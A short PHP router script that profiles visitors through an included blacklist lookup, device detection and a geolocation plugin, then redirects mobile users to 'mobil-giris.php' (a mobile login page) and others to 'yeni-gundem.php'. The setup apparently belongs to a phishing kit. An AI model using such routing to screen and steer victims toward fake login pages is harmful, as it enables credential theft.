<?php 

    include '1engel/blacklist_lookup.php';
    include '2ktnrl/Mobile_Detect.php';
    $detect = new Mobile_Detect;
    include '2ktnrl/geoplugin.class.php';
    include '2ktnrl/src/vendor/autoload.php';
    use DeviceDetector\DeviceDetector;
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $deviceDetector = new DeviceDetector($userAgent);
    $deviceDetector->parse();
    $device = $deviceDetector->getDeviceName();
    $model = $deviceDetector->getModel();

    if ( $detect->isMobile() ) {
        header("Location: mobil-giris.php");
        exit();
    } else {
        header("Location: yeni-gundem.php");
        exit();
    }
?>